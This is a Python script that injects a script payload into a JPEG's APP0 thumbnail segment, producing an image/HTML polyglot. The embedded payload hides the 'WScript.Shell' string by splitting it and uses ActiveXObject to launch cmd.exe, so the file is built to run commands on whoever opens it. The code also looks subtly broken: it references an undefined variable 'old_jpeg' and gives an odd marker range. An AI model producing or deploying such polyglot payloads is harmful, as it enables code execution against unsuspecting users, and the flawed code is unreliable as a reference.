import sys
import struct
import os

if len(sys.argv) < 2:
    print("Error: No arguments provided.", file=sys.stderr)
    sys.exit(1)

filename = sys.argv[1]
split_fname = os.path.splitext(filename)
extension = split_fname[1]
root = split_fname[0]

payload = b'<script>a="WScri";b="pt.She";c="ll";new ActiveXObject(a+b+c).Run("cmd.exe");</script>'

with open(filename, "rb") as f:
    jpg = f.read()

if len(jpg) < 2 or jpg[0:2] != b'\xFF\xD8':
    print("Error: Not a valid JPG", file=sys.stderr)
    sys.exit(1)

def parse_jpg_segments(jpg):
    # parse all marker bytes and give type to relevant ones
    # using marker types data from https://gist.github.com/RavuAlHemio/82959fb698790781c08716b22496e9fe
    segments = {}
    pos = 2  # Skip SOI

    while pos < len(jpg) - 1:
        # All markers have form 0xFFXX
        if jpg[pos] != 0xFF:
            print(f"Error: expect 0xffXX at offset {pos} but found {jpg[pos:pos+1].hex()}", file=sys.stderr)
            sys.exit(1)

        marker = jpg[pos + 1]

        #0x00/0xFF is FF as literal data but we dont parse for FF anyway but jump through the file using length so we did something wrong
        if marker in [0x00, 0xFF]:
            print(f"Error parsing ended up in data not a segment beginning", file=sys.stderr)
            sys.exit(1)
        # no length field , 
        if marker == 0x01 or marker in range(0xD0, 0xD10):
            pos += 2
        else:
            #has length field  
            length = struct.unpack('>H', jpg[pos + 2:pos + 4])[0]
            length += 2 # the marker
            # APP0
            if marker == 0xE0:
                segments['APP0'] = {'type': 'APP0', 'pos': pos, 'length': length}
                pos += length

            # APP1
            elif marker == 0xE1:
                segments['APP1']={'type': 'APP1', 'pos': pos, 'length': length}
                pos += length

            # SOS = img data, after this nothing of interest follow anyway so just quit
            #https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure
            elif marker == 0xDA:
                segments['SOS']={'type': 'SOS', 'pos': pos, 'length': length}  
                return segments  # quit

            # other but with dynamic 
            else:
                pos += length 

    return segments

def create_app0(payload):
    max_size = 255*3
    if(len(payload) > max_size):
        print(f"Error: maximum supported payload is {max_size}", file=sys.stderr)
        sys.exit(1)
    # Pad payload
    mod3 = len(payload) % 3
    if mod3 != 0:
        payload = payload + (b'\x00' * (3-mod3))
  

    width = 1 #TODO calculate width and height in some dynamical way
    height = len(payload) // 3

    magic= b'JFIF\x00'  # jfif magic
    version = b'\x01\x02'  # 1.2
    density_units = b'\x00'  # no units
    x_density = b'\x00\x01'  
    y_density = b'\x00\x01' 
    enc_width = struct.pack('B', width)
    enc_height = struct.pack('B', height)

    content = magic + version + density_units + x_density + y_density + enc_width + enc_height + payload
    length = struct.pack('>H',len(content) + 2) #len field includes itself excludes marker
    marker = b'\xFF\xE0'
    app0 = marker + length + content
    return app0


def inject_segment(old_jpg, segment, segment_name):
    # Only supports APP0 APP1 and SOS 
    #just update the segment either replace or insert new
    # this is relatively easy since jpeg doesnt have any directory, size or checksum fields
    segments = parse_jpg_segments(old_jpeg)
    existing_segment = segments.get(segment_name, None)
    result = bytearray(old_jpg)

    if existing_segment:
        # replace
        pos = existing_segment['pos']
        old_len = existing_segment['length']
        result[pos:pos+old_len] = segment #bytearray resize
        segment_offset = pos
    else:
        # new segment
        result[2:2] = segment
        segment_offset = 2

    return bytes(result), segment_offset

app0 = create_app0(payload)

new_jpg, offset = inject_segment(jpg, app0, "APP0")

out = root + "_poly" + extension
with open(out, "wb") as f:
    f.write(new_jpg)

print(f"Injected APP0 segment with payload at offset {offset} in file {out}")